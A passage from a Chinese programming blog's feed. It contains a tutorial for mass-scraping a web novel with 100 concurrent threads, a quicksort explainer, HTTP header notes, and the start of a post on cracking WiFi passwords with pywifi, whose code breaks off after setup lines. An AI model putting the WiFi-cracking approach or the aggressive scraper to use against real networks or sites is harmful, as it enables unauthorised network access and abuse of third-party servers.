                     data-src="/../blog_img/py_bs4_2/Snipaste_2024-06-21_17-29-57.png"
                     
                ></p>
<p>但是我们复制的结果是：<code>body &gt; div.listmain &gt; dl &gt; dd:nth-child(2) &gt; a</code></p>
<p>因为我们要拿到最后一个章节的链接，而这个选择只能让我们拿到第一个章节的url，所以我们需要改一下，改为：<code>body &gt; div.listmain &gt; dl &gt; dd a</code></p>
<p>我们就能拿到这样的信息了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_bs4_2/Snipaste_2024-06-21_17-33-03.png"
                     
                ></p>
<p>这是一个列表，最后的章节在列表的最后一个，我们可以用<code>list[-1]</code>来获取到最后一个章节的链接。</p>
<p>我们通过<code>list[-1][&#39;href&#39;]</code>来获取到最后一个章节的链接,这是bs4的一种方法。</p>
<p>接下来我们用正则表达式来匹配这个链接，正则表达式的匹配规则是：<code>r&quot;/book/78647/(.*).html&quot;</code></p>
<blockquote>
<p>其中<code>（.*）</code>的意思是匹配任意字符，当然必须在<code>/book/78647/</code>和<code>.html</code>之间。</p>
</blockquote>
<p>对于正则的使用可以来这里学习：<a class="link"   href="https://deerchao.cn/tutorials/regex/regex.htm" >https://deerchao.cn/tutorials/regex/regex.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这样最后我们就拿到了最大的页码了，也就是313</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_bs4_2/Snipaste_2024-06-21_17-43-03.png"
                     
                ></p>
<hr>
<blockquote>
<p><strong>在这个网站中还有点小问题他隐藏了一部分章节的url在另一个代码块中，大家可以去看看</strong></p>
</blockquote>
<hr>
<h3 id="代码-下载"><a href="#代码-下载" class="headerlink" title="代码:下载"></a>代码:下载</h3><p>我们现在需要先写一个代码把第一页的内容都下载下来，其他的页面，除了url不一样以外其他的相同。</p>
<p>我们先进入第一页，F12进入开发者工具，分析一下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_bs4_2/Snipaste_2024-06-21_17-47-29.png"
                     
                ></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;book&quot;</span>):</span><br><span class="line">    os.mkdir(<span class="string">&quot;book&quot;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.bigee.cc/book/78647/1.html&quot;</span></span><br><span class="line">res = requests.get(url,headers=headers).text</span><br><span class="line">soup = BeautifulSoup(res,<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = soup.select(<span class="string">&quot;#read &gt; div.book.reader &gt; div.content &gt; h1&quot;</span>)[<span class="number">0</span>].get_text() <span class="comment">#获取小说名</span></span><br><span class="line"><span class="comment">#print(name)</span></span><br><span class="line"></span><br><span class="line">content = soup.select(<span class="string">&quot;#chaptercontent&quot;</span>)<span class="comment">#获取章节内容</span></span><br><span class="line">content = <span class="built_in">str</span>(content[<span class="number">0</span>].get_text())<span class="comment">#获取章节内容</span></span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">f&quot;webspider_book/<span class="subst">&#123;name&#125;</span>.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><code>bs4</code>中获取标签内容的方法，是使用<code>get_text()</code> 方法，我们可以直接获取到章节的内容，但是我们用的<code>select</code>方法，返回的是一个列表，我们就需要拿到列表中的内容，当然，列表中也就只有这一个元素。因为我们选择器选择的<code>#chaptercontent</code>标签（浏览器复制的地址就是这个），所以我们直接用<code>content[0]</code>就能拿到章节的标签，然后用<code>get_text()</code>方法来获取到章节的内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_bs4_2/Snipaste_2024-06-21_18-04-12.png"
                     
                ></p>
<p>小说名同理，直接去网页上用浏览器直接复制地址就可以了。</p>
<p>然后我们把章节的内容写入文件，文件名就是小说名，我们用<code>f = open(f&quot;webspider_book/&#123;name&#125;.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)</code>来创建文件，然后用<code>f.write(content)</code>来写入内容。</p>
<p>这样我们就下载了第一页的内容。</p>
<hr>
<h3 id="代码-优化实现"><a href="#代码-优化实现" class="headerlink" title="代码:优化实现"></a>代码:优化实现</h3><p>我们现在已经有了下载单个页面的函数，我们可以用线程池来加速下载，我们可以用<code>ThreadPoolExecutor</code>来创建线程池，然后用<code>submit()</code>方法来提交任务。</p>
<p>简单来说，我们不需要用循环来慢慢下载网页内容了，我们直接用线程池来下载，线程池创建本来就需要循环，我们把有规律的url遍历提交给线程池。</p>
<p>正常放前面不经常用和经常用但不需要改动的数据</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor <span class="comment">#导入线程池，加速爬取</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;webspider_book&quot;</span>):</span><br><span class="line">    os.mkdir(<span class="string">&quot;webspider_book&quot;</span>)</span><br><span class="line"></span><br><span class="line">url =<span class="string">&quot; https://www.bigee.cc/book/78647/&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>在前面的讲述中</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">res = requests.get(url,headers=headers)</span><br><span class="line">soup = BeautifulSoup(res.text,<span class="string">&quot;lxml&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>用到了两次，所以就干脆写了个函数，这样就不用重复写了，让代码看起来干净些。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_url</span>(<span class="params">url</span>):<span class="comment">#要用两次直接写个函数算了</span></span><br><span class="line">    res = requests.get(url,headers=headers)</span><br><span class="line">    soup = BeautifulSoup(res.text,<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> soup</span><br></pre></td></tr></table></figure></div>

<p>因为我们需要实例化，所以这个函数就得把实例化的对象<code>soup</code>返回，这样才可以使用。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_max_page</span>(<span class="params">url</span>): <span class="comment">#获取下载的最大页数</span></span><br><span class="line">    <span class="built_in">list</span> = get_url(url).select(<span class="string">&quot;body &gt; div.listmain &gt; dl &gt; dd a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    page_finall = re.findall(<span class="string">r&quot;/book/78647/(.*).html&quot;</span>, <span class="built_in">str</span>(<span class="built_in">list</span>[-<span class="number">1</span>][<span class="string">&#x27;href&#x27;</span>]))[<span class="number">0</span>] <span class="comment">#正则匹配最后一个章节的页码</span></span><br><span class="line">    <span class="comment">#print(page_finall)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page_finall <span class="comment">#返回最大页数</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这个函数就是获取最大的页码,但是他也需要先实例化<code>soup</code>对象，所以我们就把<code>get_url()</code>函数也写进来，让他实例化并返回<code>soup</code>对象，最后正则获取到最后一个章节的url。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_book_content</span>(<span class="params">url</span>):<span class="comment">#下载单个页面的函数</span></span><br><span class="line"></span><br><span class="line">    soup = get_url(url)</span><br><span class="line">    name = soup.select(<span class="string">&quot;#read &gt; div.book.reader &gt; div.content &gt; h1&quot;</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">    <span class="comment">#print(name)</span></span><br><span class="line">    content = soup.select(<span class="string">&quot;#chaptercontent&quot;</span>) <span class="comment">#获取章节内容</span></span><br><span class="line">    content = <span class="built_in">str</span>(content[<span class="number">0</span>].get_text()) <span class="comment">#获取章节内容</span></span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">f&quot;webspider_book/<span class="subst">&#123;name&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    f.write(content)<span class="comment">#写入文件</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>下载完成----------&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这个函数是下载对应页面的内容，他也需要先实例化<code>soup</code>对象，所以我们继续用我们刚开始写的<code>get_url()</code>函数来实例化，然后用<code>select()</code>方法来获取到小说名，然后用<code>get_text()</code>方法来获取到小说名和章节内容。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    num = <span class="built_in">int</span>(get_max_page(url=url))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;共<span class="subst">&#123;num&#125;</span>页----------&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">100</span>) <span class="keyword">as</span> t: <span class="comment">#线程池大小为100</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,num+<span class="number">1</span>):</span><br><span class="line">            t.submit(get_book_content,<span class="string">f&quot;https://www.bigee.cc/book/78647/<span class="subst">&#123;i&#125;</span>.html&quot;</span>) <span class="comment">#提交任务</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;线程池执行完毕&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>在这里我们先运行<code>get_max_page()</code>函数来获取最大的页码，url我们在上面已经先声明了，然后我们用<code>ThreadPoolExecutor</code>来创建线程池，线程池大小为100 **(可以自己调整)**，然后用<code>for</code>循环来遍历所有的页码，然后用<code>submit()</code>方法来提交任务，任务就是<code>get_book_content()</code>函数，我们把页码和url拼接起来，然后提交给线程池,这样我们就能很快的把小说爬完了。</p>
<hr>
<h1 id="如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！"><a href="#如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！" class="headerlink" title="如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！"></a>如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！</h1><blockquote>
<p>爱发电地址:<a class="link"   href="https://afdian.com/a/AuroraBreeze" >https://afdian.com/a/AuroraBreeze <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>排序算法</title>
    <url>/2024/07/09/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>在这里我们讲解我们在pywiif中使用的<code>快速排序</code>算法。</p>
<ul>
<li>快速排序   非常高效，采用分治法。然而，分治法也可能导致大量的递归调用，从而增加调用栈的负担，这在某些情况下可能导致栈溢出。</li>
</ul>
<hr>
<h2 id="快速排序算法"><a href="#快速排序算法" class="headerlink" title="快速排序算法"></a>快速排序算法</h2><p>快速排序算法代码：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quicksort</span>(<span class="params">array</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(array) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> array</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 随机选择基准元素</span></span><br><span class="line">        pivot_index = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(array) - <span class="number">1</span>)</span><br><span class="line">        pivot = array[pivot_index]</span><br><span class="line">        left = []  <span class="comment"># 小于基准的元素</span></span><br><span class="line">        right = []  <span class="comment"># 大于基准的元素</span></span><br><span class="line">        mid = []  <span class="comment"># 等于基准的元素</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> array:</span><br><span class="line">            <span class="keyword">if</span> value &lt; pivot:</span><br><span class="line">                left.append(value)</span><br><span class="line">            <span class="keyword">elif</span> value &gt; pivot:</span><br><span class="line">                right.append(value)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mid.append(value)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将较大的元素放在前面</span></span><br><span class="line">        <span class="keyword">return</span> quicksort(right) + mid + quicksort(left)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行快速排序</span></span><br><span class="line">sorted_array = quicksort([<span class="number">3</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sorted_array)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>算法的步骤如下：</p>
<ol>
<li>选择一个基准值，我们通常选择中间的元素作为基准值。</li>
<li>遍历数组，将小于基准值的元素放到左边，大于基准值的元素放到右边。</li>
<li>递归地对左右两边的子数组进行相同的操作。</li>
</ol>
</blockquote>
<p>如果数组就只有一个元素，就没有必要进行排序，直接返回，用<code>if</code>判断即可。</p>
<p>当数组的长度大于1时，我们随机选择一个元素作为基准值，用<code>random.randint(0, len(array) - 1)</code>函数随机选择一个索引作为基准值。</p>
<p>这里我们选择<code>10</code>做为基准值，设立两个放置元素的列表<code>left</code>和<code>right</code>，然后遍历数组，将小于<code>10</code>的元素放到<code>left</code>，大于<code>10</code>的元素放到<code>right</code>。</p>
<p>这样我们的<code>left</code>列表里就只有小于<code>10</code>的元素，<code>right</code>列表里就只有大于<code>10</code>的元素。即<code>left</code>列表是<code>[3，6，8，1，2，1]</code>，<code>right</code>列表为空。</p>
<p>到这个函数的最后，<code>return quicksort(right) + mid + quicksort(left)</code>会再次调用<code>quicksort</code>函数，对<code>right</code>列表和<code>left</code>进行排序，步骤和前面一样。</p>
<p>最后，我们将排好的<code>right</code>列表、<code>mid</code>列表和<code>left</code>列表的元素合并，得到一个排序好的数组。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>图解HTTP笔记</title>
    <url>/2024/10/13/%E5%9B%BE%E8%A7%A3HTTP%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="简单的HTTP协议"><a href="#简单的HTTP协议" class="headerlink" title="简单的HTTP协议"></a>简单的HTTP协议</h1><h2 id="HTTP请求报文"><a href="#HTTP请求报文" class="headerlink" title="HTTP请求报文"></a>HTTP请求报文</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36</span><br><span class="line"></span><br><span class="line">name=value&amp;name2=value2</span><br></pre></td></tr></table></figure></div>

<ol>
<li>请求行：</li>
</ol>
<ul>
<li>GET：请求方法，表示请求获取资源。</li>
<li>&#x2F;index.html：请求资源的路径。</li>
<li>HTTP&#x2F;1.1：HTTP版本。</li>
</ul>
<ol start="2">
<li>请求首部：</li>
</ol>
<ul>
<li>Host：指定请求的服务器域名。</li>
<li>Connection：指定与服务器的连接类型，可以是keep-alive或close。</li>
<li>Upgrade-Insecure-Requests：指定是否使用HTTP升级。</li>
<li>User-Agent：指定客户端浏览器类型。</li>
</ul>
<ol start="3">
<li>请求数据：</li>
</ol>
<ul>
<li>name&#x3D;value&amp;name2&#x3D;value2：请求数据，一般是查询字符串。<strong>内容实体</strong>。</li>
</ul>
<h2 id="HTTP响应报文"><a href="#HTTP响应报文" class="headerlink" title="HTTP响应报文"></a>HTTP响应报文</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 13 Jan 2024 04:30:00 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Last-Modified: Mon, 09 Aug 2019 02:53:20 GMT</span><br><span class="line">ETag: &quot;3147526947&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 1546</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>状态行：<br>200 OK：表示请求成功，状态码为200。</p>
</li>
<li><p>响应首部：</p>
</li>
</ol>
<ul>
<li>Date：响应产生的时间。</li>
<li>Server：服务器软件名称。</li>
<li>Last-Modified：资源的最后修改时间。</li>
<li>ETag：资源的标识符。</li>
<li>Accept-Ranges：服务器是否支持范围请求。</li>
<li>Content-Length：响应内容的长度。</li>
<li>Content-Type：响应内容的类型。</li>
</ul>
<ol start="3">
<li>响应数据：<br>响应内容，一般是<code>HTML</code>、<code>CSS</code>、<code>JavaScript</code>、<code>图片</code>等内容。</li>
</ol>
<h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><ol>
<li>GET：请求获取资源。</li>
<li>POST：向服务器提交数据，请求服务器处理数据。</li>
<li>PUT：上传文件到服务器。 一般因为安全问题不支持使用。</li>
<li>DELETE：删除服务器上的文件。 一般因为安全问题不支持使用。</li>
<li>HEAD：类似于GET，但只返回HTTP头部。</li>
<li>OPTIONS：询问服务器对特定资源支持的方法。</li>
<li>TRACE：回显服务器收到的请求，主要用于测试或诊断。 一般不支持使用。</li>
<li>CONNECT：与代理服务器通信时建立隧道。</li>
</ol>
<h2 id="HTTP小记"><a href="#HTTP小记" class="headerlink" title="HTTP小记"></a>HTTP小记</h2><ol>
<li><p>HTTP是不保存状态的协议，协议对于发送过的请求或相应都不做持久化处理。</p>
<ul>
<li>为了实现保存状态，引入了Cookie和Session技术，服务器发送Set-Cookie响应首部，客户端接收后保存在本地，下次请求时在请求头部添加Cookie。</li>
</ul>
</li>
<li><p>HTTP1.1使用持续连接（Persistent Connections）来保持连接，减轻服务器负担，减少延迟，并使用管线化(Pipelining)技术，并行发送多个请求。</p>
</li>
</ol>
<h1 id="HTTP报文信息"><a href="#HTTP报文信息" class="headerlink" title="HTTP报文信息"></a>HTTP报文信息</h1><h2 id="HTTP发送多数据集合"><a href="#HTTP发送多数据集合" class="headerlink" title="HTTP发送多数据集合"></a>HTTP发送多数据集合</h2><ul>
<li>多部份对象集合包含的对象如下：<ul>
<li>mulitpart&#x2F;form-data：在web表单文件上传时使用。</li>
<li>mulitpart&#x2F;byteranges：用于断点续传。</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">content-type: multipart/form-data; boundary=Auro</span><br><span class="line"></span><br><span class="line">--Auro</span><br><span class="line">Content-Disposition: form-data; name=&quot;text&quot;</span><br><span class="line"></span><br><span class="line">hello world</span><br><span class="line">--Auro</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">hello world</span><br><span class="line">--Auro--</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">Content-Type: multipart/byteranges; boundary=Auro</span><br><span class="line">Content-Range: bytes 0-1023/2048</span><br><span class="line"></span><br><span class="line">--Auro</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Range: bytes 0-1023/2048</span><br><span class="line"></span><br><span class="line">(指定范围的数据)</span><br><span class="line"></span><br><span class="line">--Auro</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Range: bytes 1024-2047/2048</span><br><span class="line"></span><br><span class="line">(指定范围的数据)</span><br><span class="line"></span><br><span class="line">--Auro--</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>注意：</p>
<ul>
<li>使用<code>boundary</code>参数指定分隔符,并在起始行使用<code>--</code>作为分隔符,在最后使用<code>--</code>来表示结束。</li>
<li><code>Content-Range</code>首部用于指定当前分块的范围。</li>
</ul>
</blockquote>
<h1 id="内容协商"><a href="#内容协商" class="headerlink" title="内容协商"></a>内容协商</h1><blockquote>
<p>内容协商（Content Negotiation）是指客户端和服务器之间互相通告自己偏好的内容，然后由服务器根据双方的偏好提供合适的内容。</p>
<p>通常会用到的请求报文的首部字段如下：</p>
<ul>
<li>Accept：客户端可接受的响应内容类型。</li>
<li>Accept-Charset：客户端可接受的字符集。</li>
<li>Accept-Encoding：客户端可接受的编码方式。</li>
<li>Accept-Language：客户端可接受的语言。</li>
<li>Content-Language：响应内容的语言。</li>
</ul>
</blockquote>
<h2 id="三种内容协商方式及其特点"><a href="#三种内容协商方式及其特点" class="headerlink" title="三种内容协商方式及其特点"></a>三种内容协商方式及其特点</h2><ul>
<li>服务器驱动协商（Server-driven Negotiation）：服务器根据客户端的请求信息，提供合适的内容。</li>
<li>客户端驱动协商（Client-driven Negotiation）：客户端根据服务器的响应信息，选择合适的资源。</li>
<li>透明协商（Transparent Negotiation）：客户端和服务器之间不作任何协商，由客户端自己决定如何处理响应。</li>
</ul>
<h1 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h1><ol>
<li>1xx：指示信息–表示请求已接收，继续处理。</li>
<li>2xx：成功–表示请求已被成功接收、理解、并接受。</li>
<li>3xx：重定向–要完成请求必须进行更进一步的操作。</li>
<li>4xx：客户端错误–请求有语法错误或请求无法实现。</li>
<li>5xx：服务器错误–服务器未能实现合法的请求。</li>
</ol>
<blockquote>
<p>200 OK：请求成功。</p>
<p>204 No Content：请求成功，但响应报文不含实体的主体部分。</p>
<p>206 Partial Content：客户端进行了范围请求，响应报文包含由Content-Range指定范围的实体内容。</p>
<p>301 Moved Permanently：永久重定向，请求的资源已被分配新的URL。</p>
<p>302 Found：临时重定向，请求的资源已被分配新的URL。</p>
<p>304 Not Modified：如果客户端发送了一个带条件的GET请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。</p>
<p>400 Bad Request：请求报文中存在语法错误。</p>
<p>401 Unauthorized：请求未经授权。</p>
<p>403 Forbidden：服务器拒绝请求。</p>
<p>404 Not Found：服务器无法找到请求的资源。</p>
<p>500 Internal Server Error：服务器遇到错误，无法完成请求。</p>
<p>503 Service Unavailable：服务器当前不能处理请求，一段时间后可能恢复正常。</p>
</blockquote>
<h1 id="HTTP首部字段"><a href="#HTTP首部字段" class="headerlink" title="HTTP首部字段"></a>HTTP首部字段</h1><h2 id="通用首部字段"><a href="#通用首部字段" class="headerlink" title="通用首部字段"></a>通用首部字段</h2><ol>
<li>Cache-Control：指定请求或响应的缓存机制。</li>
<li>Connection：连接的管理。</li>
<li>Date：创建报文的日期时间。</li>
<li>Pragma：实现特定的功能，比如no-cache。</li>
<li>Trailer：指出尾部将会发送的首部。</li>
<li>Transfer-Encoding：指定报文主体的传输编码方式。</li>
<li>Upgrade：升级协议。</li>
<li>Warning：关于消息的警告信息。</li>
</ol>
<h2 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h2><ol>
<li>Accept：可接受的响应内容类型。</li>
<li>Accept-Charset：可接受的字符集。</li>
<li>Accept-Encoding：可接受的编码方式。</li>
<li>Accept-Language：可接受的语言。</li>
<li>Authorization：授权信息。</li>
<li>Expect：期望服务器的特定行为。</li>
<li>From：用户的电子邮箱地址。</li>
<li>Host：请求资源所在的服务器。</li>
<li>If-Match：只有请求内容与实体相匹配才有效。</li>
<li>If-Modified-Since：如果请求的资源在指定日期之后有修改，则请求成功。</li>
<li>If-None-Match：只有请求内容与实体不匹配才有效。</li>
<li>If-Range：如果实体未改变，发送客户端当前实体的部分内容。</li>
<li>If-Unmodified-Since：如果请求的资源在指定日期之后没有修改，则请求成功。</li>
<li>Max-Forwards：最大传输途径。</li>
<li>Range：请求实体的部分内容。</li>
<li>Referer：先前网页的地址，当前请求网页紧随其后。</li>
<li>TE：可接受的传输编码方式。</li>
<li>User-Agent: 客户端程序信息。</li>
</ol>
<h2 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h2><ol>
<li>Accept-Ranges：服务器是否接受范围请求。</li>
<li>Age：资源的有效时间。</li>
<li>ETag：资源的标识符。</li>
<li>Location：重定向的URI。</li>
<li>Retry-After：如果服务器在指定时间内没有收到请求，则可以再次发送请求。</li>
<li>Server：服务器软件信息。</li>
<li>WWW-Authenticate：服务器对客户端的认证信息。</li>
<li>Vary ：告诉缓存服务器在什么条件下才能使用响应的缓存。</li>
<li>Proxy-Authenticate: 代理服务器对客户端的认证信息。</li>
</ol>
<h2 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h2><ol>
<li>Allow：资源可支持的HTTP方法。</li>
<li>Content-Encoding：实体主体适用的编码方式。</li>
<li>Content-Language：实体主体的语言。</li>
<li>Content-Length：实体主体的大小。</li>
<li>Content-Location：替代的资源所在位置。</li>
<li>Content-MD5：实体主体的MD5摘要。</li>
<li>Content-Range：实体主体的位置范围。</li>
<li>Content-Type：实体主体的媒体类型。</li>
<li>Expires：实体主体过期的日期时间。</li>
<li>Last-Modified：资源的最后修改日期时间。</li>
<li>extension-header：可以添加任何扩展的首部字段。</li>
</ol>
]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>pywifi破解WiFi密码示例</title>
    <url>/2024/07/08/pywifi%E7%A0%B4%E8%A7%A3WiFi%E5%AF%86%E7%A0%81%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文章代码仅供参考，个人学习使用，请勿用于非法用途。</p>
<h2 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">__author__ = <span class="string">&#x27;ximenxiaoxue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys <span class="comment">#进行错误检查</span></span><br><span class="line"><span class="keyword">import</span> random <span class="comment">#快速排序使用</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pywifi </span><br><span class="line"><span class="keyword">from</span> pywifi <span class="keyword">import</span> const,Profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 功能：</span></span><br><span class="line"><span class="comment">#1.判断自身是否连接到wifi</span></span><br><span class="line"><span class="comment">#2.选择是否进行wifi密码破解，新建一个函数进行选择</span></span><br><span class="line"><span class="comment">#3.进行破解</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wifi_attack_main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  <span class="comment">#这个是整个程序的入口，看这个函数的步骤就可以分析整个程序的流程了</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.wifi = pywifi.PyWiFi() <span class="comment">#创建wifi对象</span></span><br><span class="line">        <span class="variable language_">self</span>.iface = <span class="variable language_">self</span>.wifi.interfaces()[<span class="number">0</span>] <span 